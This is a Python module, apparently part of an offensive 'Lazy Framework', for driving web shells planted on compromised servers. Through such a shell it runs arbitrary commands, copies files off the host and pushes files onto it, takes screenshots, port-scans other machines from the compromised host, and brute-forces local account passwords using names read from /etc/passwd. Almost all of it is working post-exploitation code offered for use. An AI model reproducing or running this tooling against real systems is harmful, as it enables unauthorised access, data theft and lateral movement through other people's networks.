#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Web Shell Manager - Manage and interact with deployed web shells
"""

import os
import sys
import requests
import json
import time
import re
from pathlib import Path
from urllib.parse import urljoin, urlencode, urlparse
import threading
from concurrent.futures import ThreadPoolExecutor
import urllib3

# Disable SSL warnings untuk testing
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

MODULE_INFO = {
    "name": "Web Shell Manager",
    "description": "Manage and interact with multiple deployed web shells via HTTP/HTTPS/IP",
    "author": "Lazy Framework Team",
    "license": "MIT",
    "platform": "Multi",
    "rank": "Excellent",
    "references": [],
    "dependencies": ["requests"]
}

OPTIONS = {
    "TARGET": {
        "description": "Target URL/IP dengan port (http://ip, https://domain, http://ip:port)",
        "required": True,
        "default": "http://192.168.1.100/shell.php"
    },
    "PASSWORD": {
        "description": "Password untuk autentikasi web shell",
        "required": False,
        "default": ""
    },
    "METHOD": {
        "description": "Metode request (GET/POST)",
        "required": False,
        "default": "GET"
    },
    "PARAMETER": {
        "description": "Nama parameter untuk commands",
        "required": False,
        "default": "cmd"
    },
    "TIMEOUT": {
        "description": "Timeout request dalam detik",
        "required": False,
        "default": "30"
    }
}

class WebShellManager:
    def __init__(self, options):
        self.options = options
        self.session = requests.Session()
        
        # Parse target URL
        target = options.get('TARGET', 'http://192.168.1.100/shell.php')
        self.shell_url = self.normalize_target_url(target)
        
        self.password = options.get('PASSWORD', '')
        self.method = options.get('METHOD', 'GET').upper()
        self.parameter = options.get('PARAMETER', 'cmd')
        self.timeout = int(options.get('TIMEOUT', '30'))
        self.connected = False
        self.shell_type = "Unknown"
        self.target_info = {}
        
        # Configure session untuk berbagai skenario
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': '*/*',
            'Connection': 'keep-alive'
        })
        
        # SSL verification disabled untuk testing
        self.session.verify = False
    
    def normalize_target_url(self, target):
        """Normalize berbagai format target URL"""
        target = target.strip()
        
        # Jika hanya IP/host tanpa protocol
        if not target.startswith(('http://', 'https://')):
            # Coba detect jika ini IP:port atau domain
            if ':' in target and not target.startswith('/'):
                # Format: ip:port/path
                if target.count(':') == 1 and not target.split(':')[1].startswith('/'):
                    target = f"http://{target}"
                else:
                    target = f"http://{target}"
            else:
                # Format: domain.com/path atau ip/path
                target = f"http://{target}"
        
        # Parse URL untuk validasi
        parsed = urlparse(target)
        
        # Jika tidak ada path, tambahkan shell default
        if not parsed.path or parsed.path == '/':
            target = target.rstrip('/') + '/shell.php'
        
        print(f"[*] Target URL: {target}")
        return target
    
    def detect_target_info(self):
        """Deteksi informasi tentang target"""
        try:
            # Test koneksi dasar
            test_url = self.shell_url.split('?')[0]  # Remove parameters
            response = self.session.get(test_url, timeout=10, verify=False)
            
            self.target_info = {
                'http_server': response.headers.get('Server', 'Unknown'),
                'powered_by': response.headers.get('X-Powered-By', 'Unknown'),
                'content_type': response.headers.get('Content-Type', 'Unknown'),
                'status_code': response.status_code
            }
            
            print(f"[*] Target Information:")
            print(f"    HTTP Server: {self.target_info['http_server']}")
            print(f"    Powered By: {self.target_info['powered_by']}")
            print(f"    Content Type: {self.target_info['content_type']}")
            
        except Exception as e:
            print(f"[-] Cannot detect target info: {e}")
    
    def check_connection(self):
        """Check jika web shell accessible dan working"""
        print("[*] Testing connection to web shell...")
        
        # Deteksi info target dulu
        self.detect_target_info()
        
        test_commands = {
            'whoami': 'Check current user',
            'pwd': 'Check current directory', 
            'uname -a': 'Check system info',
            'echo "TEST_SUCCESS"': 'Basic command test'
        }
        
        success_count = 0
        results = {}
        
        for cmd, desc in test_commands.items():
            print(f"    Testing: {cmd} - {desc}")
            try:
                result = self.execute_command_raw(cmd)  # Use raw execution for connection test
                if result and "Error:" not in result and "not found" not in result.lower():
                    # Check untuk success indicators
                    if "TEST_SUCCESS" in result or len(result.strip()) > 0:
                        success_count += 1
                        results[cmd] = result.strip()
                        print(f"    [+] Success: {result[:80]}...")
                    else:
                        print(f"    [-] No output or error: {result}")
                else:
                    print(f"    [-] Failed: {result}")
            except Exception as e:
                print(f"    [-] Error: {e}")
            
            time.sleep(0.5)
        
        if success_count >= 2:
            self.connected = True
            # Detect shell type based on responses
            response_text = str(results.values()).lower()
            
            if "www-data" in response_text or "apache" in response_text:
                self.shell_type = "PHP/Linux"
            elif "nt authority" in response_text or "microsoft" in response_text:
                self.shell_type = "ASP/Windows" 
            elif "linux" in response_text:
                self.shell_type = "Linux Shell"
            elif "windows" in response_text:
                self.shell_type = "Windows Shell"
            else:
                self.shell_type = "Generic Web Shell"
                
            print(f"\n[+] Connection successful! Shell type: {self.shell_type}")
            return True
        else:
            self.connected = False
            print(f"\n[-] Connection failed! Only {success_count}/4 tests passed")
            print("[!] Troubleshooting tips:")
            print("    - Check web shell URL/IP and port")
            print("    - Verify web shell is deployed and accessible")
            print("    - Check password (if required)")
            print("    - Verify parameter name matches web shell")
            print("    - Try different protocol (http/https)")
            return False

    def execute_command_raw(self, command):
        """Execute command tanpa pengecekan koneksi (untuk testing connection)"""
        try:
            if self.method == 'GET':
                params = {self.parameter: command}
                if self.password:
                    params['password'] = self.password
                
                response = self.session.get(
                    self.shell_url,
                    params=params,
                    timeout=self.timeout
                )
            else:  # POST
                data = {self.parameter: command}
                if self.password:
                    data['password'] = self.password
                
                response = self.session.post(
                    self.shell_url,
                    data=data,
                    timeout=self.timeout
                )
            
            if response.status_code != 200:
                return f"HTTP Error: {response.status_code} - {response.reason}"
            
            return response.text
            
        except requests.exceptions.ConnectTimeout:
            return "Error: Connection timeout - Target mungkin down atau port tertutup"
        except requests.exceptions.ConnectionError:
            return "Error: Cannot connect - Check URL/IP, port, dan network connectivity"
        except requests.exceptions.SSLError:
            return "Error: SSL certificate problem - Try HTTP instead of HTTPS"
        except requests.exceptions.ReadTimeout:
            return "Error: Read timeout - Command mengambil waktu terlalu lama"
        except Exception as e:
            return f"Error: {str(e)}"
    
    def execute_command(self, command):
        """Execute command pada web shell dengan pengecekan koneksi"""
        if not self.connected:
            return "Error: Not connected to web shell. Please run 'Test Connection' first."
            
        try:
            if self.method == 'GET':
                params = {self.parameter: command}
                if self.password:
                    params['password'] = self.password
                
                response = self.session.get(
                    self.shell_url,
                    params=params,
                    timeout=self.timeout
                )
            else:  # POST
                data = {self.parameter: command}
                if self.password:
                    data['password'] = self.password
                
                response = self.session.post(
                    self.shell_url,
                    data=data,
                    timeout=self.timeout
                )
            
            if response.status_code != 200:
                return f"HTTP Error: {response.status_code} - {response.reason}"
            
            return response.text
            
        except requests.exceptions.ConnectTimeout:
            return "Error: Connection timeout"
        except requests.exceptions.ConnectionError:
            self.connected = False  # Mark as disconnected
            return "Error: Connection lost - Web shell may be down"
        except requests.exceptions.SSLError:
            return "Error: SSL certificate problem"
        except requests.exceptions.ReadTimeout:
            return "Error: Read timeout"
        except Exception as e:
            return f"Error: {str(e)}"
    
    def ensure_connected(self):
        """Ensure we're connected before performing operations"""
        if not self.connected:
            print("[-] Not connected to web shell.")
            response = input("[?] Do you want to test connection now? (y/n): ").strip().lower()
            if response == 'y':
                if self.check_connection():
                    return True
            return False
        return True
    
    def test_different_protocols(self):
        """Test dengan protocol berbeda jika gagal"""
        original_url = self.shell_url
        
        protocols_to_test = []
        if original_url.startswith('https://'):
            protocols_to_test.append(original_url.replace('https://', 'http://'))
        elif original_url.startswith('http://'):
            protocols_to_test.append(original_url.replace('http://', 'https://'))
        
        print("[*] Testing alternative protocols...")
        
        for test_url in protocols_to_test:
            print(f"    Testing: {test_url}")
            self.shell_url = test_url
            if self.check_connection():
                print(f"[+] Success with: {test_url}")
                return True
            time.sleep(1)
        
        # Kembali ke original URL
        self.shell_url = original_url
        return False
    
    def interactive_shell(self):
        """Start interactive shell session"""
        if not self.ensure_connected():
            return
            
        print("[+] Starting interactive web shell...")
        print(f"[+] Shell Type: {self.shell_type}")
        print("[+] Type 'exit' to quit, 'help' for commands")
        print("[+] Connection status: CONNECTED")
        
        command_count = 0
        while True:
            try:
                cmd = input("webshell> ").strip()
                command_count += 1
                
                if cmd.lower() in ['exit', 'quit']:
                    break
                elif cmd.lower() == 'help':
                    self.show_help()
                    continue
                elif cmd.lower() == 'clear':
                    os.system('clear' if os.name == 'posix' else 'cls')
                    continue
                elif cmd.lower() == 'info':
                    self.show_shell_info()
                    continue
                elif cmd.lower() == 'status':
                    print(f"[+] Status: CONNECTED - {self.shell_type}")
                    print(f"[+] Commands executed: {command_count}")
                    continue
                elif cmd.startswith('upload '):
                    self.handle_upload(cmd)
                    continue
                elif cmd.startswith('download '):
                    self.handle_download(cmd)
                    continue
                elif cmd == 'screenshot':
                    self.take_screenshot()
                    continue
                elif cmd.startswith('scan '):
                    self.handle_port_scan(cmd)
                    continue
                elif cmd == 'reconnect':
                    self.check_connection()
                    continue
                
                result = self.execute_command(cmd)
                print(result)
                
                # Periodic connection check every 10 commands
                if command_count % 10 == 0:
                    if not self.test_connection_quick():
                        print("[!] Connection lost! Please run 'reconnect'")
                        self.connected = False
                
            except KeyboardInterrupt:
                print("\n[!] Exiting interactive shell")
                break
            except Exception as e:
                print(f"Error: {e}")
    
    def test_connection_quick(self):
        """Quick connection test tanpa output verbose"""
        try:
            result = self.execute_command_raw('echo "ALIVE"')
            return "ALIVE" in result
        except:
            return False
    
    def show_shell_info(self):
        """Show information about current shell"""
        print(f"\n[+] Web Shell Information:")
        print(f"    URL: {self.shell_url}")
        print(f"    Type: {self.shell_type}")
        print(f"    Method: {self.method}")
        print(f"    Parameter: {self.parameter}")
        print(f"    Password: {'Yes' if self.password else 'No'}")
        print(f"    HTTP Server: {self.target_info.get('http_server', 'Unknown')}")
        print(f"    Status: {'CONNECTED' if self.connected else 'DISCONNECTED'}")
        
        # Get additional system info
        if self.connected:
            commands = {
                'uname -a': 'System Info',
                'cat /etc/issue 2>/dev/null': 'OS Version',
                'ip addr 2>/dev/null': 'Network Info',
                'whoami': 'Current User'
            }
            
            for cmd, desc in commands.items():
                result = self.execute_command(cmd)
                if result and "Error:" not in result:
                    print(f"    {desc}: {result.strip()[:100]}...")
    
    def show_help(self):
        """Show available commands"""
        help_text = """
Interactive Web Shell Commands:
--------------------------------
help                    Show this help message
info                    Show shell information
status                  Show connection status
exit/quit               Exit interactive shell
clear                   Clear screen
reconnect               Re-test connection
upload <local> <remote> Upload file to target
download <remote> <local> Download file from target
screenshot              Take screenshot (if possible)
scan <target> <ports>   Port scan through shell

System Information:
--------------------------------
whoami                  Current user
pwd                     Current directory
uname -a                System information
cat /etc/passwd         List users (Linux)
net users               List users (Windows)
ip addr / ipconfig      Network configuration

File Operations:
--------------------------------
ls / dir                List directory
cat <file>              View file content
find / -name <file>     Find files
wget <url> -O <file>    Download from URL

Network Operations:
--------------------------------
netstat -tulpn          Active connections
ss -tulpn               Active connections (Linux)
ping <host>             Ping host
nmap <target>           Port scan (if available)
        """
        print(help_text)
    
    def handle_upload(self, cmd):
        """Handle file upload"""
        if not self.ensure_connected():
            return
            
        try:
            parts = cmd.split()
            if len(parts) != 3:
                print("Usage: upload <local_file> <remote_file>")
                return
            
            local_file, remote_file = parts[1], parts[2]
            
            if not os.path.exists(local_file):
                print(f"Local file not found: {local_file}")
                return
            
            with open(local_file, 'rb') as f:
                file_content = f.read()
            
            # Encode file content for command execution
            import base64
            encoded_content = base64.b64encode(file_content).decode()
            
            # Upload command varies by system
            if "Windows" in self.shell_type:
                upload_cmd = f"echo {encoded_content} > temp.b64 && certutil -decode temp.b64 {remote_file} && del temp.b64"
            else:
                upload_cmd = f"echo '{encoded_content}' | base64 -d > {remote_file}"
            
            result = self.execute_command(upload_cmd)
            
            # Verify upload
            verify_cmd = f"dir {remote_file}" if "Windows" in self.shell_type else f"ls -la {remote_file}"
            verify_result = self.execute_command(verify_cmd)
            
            if remote_file in verify_result:
                print(f"[+] File uploaded successfully: {remote_file}")
            else:
                print("[-] Upload may have failed")
                print(f"Verification: {verify_result}")
                
        except Exception as e:
            print(f"Upload error: {e}")
    
    def handle_download(self, cmd):
        """Handle file download"""
        if not self.ensure_connected():
            return
            
        try:
            parts = cmd.split()
            if len(parts) != 3:
                print("Usage: download <remote_file> <local_file>")
                return
            
            remote_file, local_file = parts[1], parts[2]
            
            # Read file content via base64
            if "Windows" in self.shell_type:
                download_cmd = f"certutil -encode {remote_file} temp.b64 && type temp.b64 && del temp.b64"
            else:
                download_cmd = f"cat {remote_file} | base64"
            
            result = self.execute_command(download_cmd)
            
            if result and "No such file" not in result and "Error:" not in result:
                import base64
                # Clean the result (remove command output artifacts)
                clean_result = result.strip().split('\n')[-1]  # Take last line
                file_content = base64.b64decode(clean_result)
                
                with open(local_file, 'wb') as f:
                    f.write(file_content)
                
                print(f"[+] File downloaded: {local_file} ({len(file_content)} bytes)")
            else:
                print(f"[-] File not found or error: {result}")
                
        except Exception as e:
            print(f"Download error: {e}")
    
    def take_screenshot(self):
        """Attempt to take screenshot (Linux/Windows)"""
        if not self.ensure_connected():
            return
            
        print("[*] Attempting to take screenshot...")
        
        if "Windows" in self.shell_type:
            # Windows screenshot (requires additional tools)
            cmd = "echo Screenshot not supported on Windows via basic shell"
        else:
            # Linux screenshot command
            cmd = "which import && import -window root screenshot.png 2>/dev/null || which scrot && scrot screenshot.png 2>/dev/null || echo 'No screenshot tool available'"
        
        result = self.execute_command(cmd)
        
        if "screenshot.png" in result or "No such file" not in self.execute_command("ls screenshot.png 2>/dev/null"):
            # Download the screenshot
            timestamp = int(time.time())
            self.handle_download(f"download screenshot.png /tmp/screenshot_{timestamp}.png")
            self.execute_command("rm -f screenshot.png")
            print(f"[+] Screenshot saved to: /tmp/screenshot_{timestamp}.png")
        else:
            print("[-] Screenshot not supported on this system")
    
    def handle_port_scan(self, cmd):
        """Handle port scan command"""
        if not self.ensure_connected():
            return
            
        parts = cmd.split()
        if len(parts) < 2:
            print("Usage: scan <target> [ports]")
            print("Example: scan 192.168.1.1 1-1000")
            return
        
        target = parts[1]
        ports = parts[2] if len(parts) > 2 else "1-1000"
        
        self.port_scan(target, ports)
    
    def port_scan(self, target, ports="1-1000"):
        """Perform port scan through web shell"""
        if not self.ensure_connected():
            return
            
        print(f"[*] Scanning {target} ports {ports}...")
        
        if "-" in ports:
            start, end = map(int, ports.split("-"))
            port_range = range(start, end + 1)
        else:
            port_range = map(int, ports.split(","))
        
        def check_port(port):
            if "Windows" in self.shell_type:
                cmd = f"powershell Test-NetConnection {target} -Port {port} -InformationLevel Quiet"
                result = self.execute_command(cmd)
                return f"Port {port}: OPEN" if "True" in result else f"Port {port}: CLOSED"
            else:
                cmd = f"timeout 1 bash -c 'echo >/dev/tcp/{target}/{port}' 2>/dev/null && echo 'Port {port}: OPEN' || echo 'Port {port}: CLOSED'"
                result = self.execute_command(cmd)
                return result.strip()
        
        open_ports = []
        with ThreadPoolExecutor(max_workers=10) as executor:
            results = list(executor.map(check_port, port_range))
        
        open_ports = [r for r in results if "OPEN" in r]
        print(f"[+] Found {len(open_ports)} open ports:")
        for port in open_ports:
            print(f"    {port}")
    
    def brute_force_passwords(self, wordlist_path, users=[]):
        """Basic password brute force through web shell"""
        if not self.ensure_connected():
            return
            
        if not os.path.exists(wordlist_path):
            print(f"Wordlist not found: {wordlist_path}")
            return
        
        if not users:
            # Try to get users from system
            print("[*] Discovering users...")
            if "Linux" in self.shell_type:
                users_result = self.execute_command("cat /etc/passwd | cut -d: -f1")
                users = users_result.split()
            else:
                users = ["admin", "root", "user", "administrator"]
        
        print(f"[*] Starting brute force with {len(users)} users...")
        
        with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
            passwords = [line.strip() for line in f if line.strip()]
        
        for user in users[:5]:  # Limit to 5 users untuk demo
            for password in passwords[:100]:  # Limit to 100 passwords untuk demo
                if "Linux" in self.shell_type:
                    cmd = f"echo '{password}' | su - {user} -c 'whoami' 2>/dev/null"
                else:
                    cmd = f"net use \\\\localhost\\IPC$ /user:{user} {password} 2>&1"
                
                result = self.execute_command(cmd)
                
                if user in result or "success" in result.lower():
                    print(f"[+] Found credentials: {user}:{password}")
                    return user, password
        
        print("[-] No valid credentials found in first 100 passwords")
        return None, None

def run(session, options):
    """Main function called by framework"""
    manager = WebShellManager(options)
    
    print("[+] Web Shell Manager Started")
    print(f"[+] Target: {manager.shell_url}")
    print(f"[+] Method: {manager.method}")
    print(f"[+] Parameter: {manager.parameter}")
    print(f"[+] Status: NOT CONNECTED")
    
    # Auto test connection pertama kali
    print("\n[*] Performing initial connection test...")
    if not manager.check_connection():
        print("\n[*] Trying alternative protocols...")
        if not manager.test_different_protocols():
            print("[-] Cannot establish connection. Please check your settings.")
            print("[!] You can still try manual connection test or change target.")
    
    while True:
        status = "CONNECTED" if manager.connected else "DISCONNECTED"
        print(f"\nWeb Shell Manager - Status: {status}")
        print("1. Test Connection")
        print("2. Interactive Shell")
        print("3. Port Scan") 
        print("4. Brute Force")
        print("5. Custom Command")
        print("6. Change Target")
        print("7. Show Info")
        print("8. Exit")
        
        choice = input("\nSelect option: ").strip()
        
        if choice == '1':
            print("\n[*] Testing connection...")
            manager.check_connection()
            
        elif choice == '2':
            manager.interactive_shell()
            
        elif choice == '3':
            if manager.ensure_connected():
                target = input("Enter target IP/host: ").strip()
                ports = input("Enter ports (1-1000 or 80,443,22): ").strip() or "1-1000"
                manager.port_scan(target, ports)
            
        elif choice == '4':
            if manager.ensure_connected():
                wordlist = input("Enter wordlist path: ").strip()
                users_input = input("Enter users (comma separated) or press enter for auto: ").strip()
                users = users_input.split(',') if users_input else []
                manager.brute_force_passwords(wordlist, users)
            
        elif choice == '5':
            if manager.ensure_connected():
                cmd = input("Enter command: ").strip()
                result = manager.execute_command(cmd)
                print(f"\nResult:\n{result}")
            
        elif choice == '6':
            new_target = input("Enter new target URL/IP: ").strip()
            manager.shell_url = manager.normalize_target_url(new_target)
            print(f"[+] Target changed to: {manager.shell_url}")
            manager.connected = False  # Reset connection status
            manager.check_connection()
            
        elif choice == '7':
            manager.show_shell_info()
            
        elif choice == '8':
            print("[+] Exiting Web Shell Manager")
            break
            
        else:
            print("[-] Invalid option")
